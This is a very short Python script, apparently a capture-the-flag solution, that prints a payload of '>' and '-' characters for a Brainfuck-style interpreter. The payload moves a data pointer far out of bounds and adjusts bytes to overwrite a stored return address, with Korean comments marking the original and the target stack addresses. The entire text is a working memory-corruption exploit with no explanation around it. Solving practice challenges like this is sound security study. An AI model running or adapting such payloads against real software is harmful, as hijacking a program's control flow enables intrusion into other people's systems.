payload = payload = ">" * 1049 + "-" * (0x2d + (0x100-0xea)) + ">" + "-" * (0xdb + (1)) + ">" + "-" * (0xf7 + 1)
print(payload)

# 0x7fffffffe438
# ->
# 0x7fffffffea00 목표 주소
# 0x7ffff7db2d90 원래 주소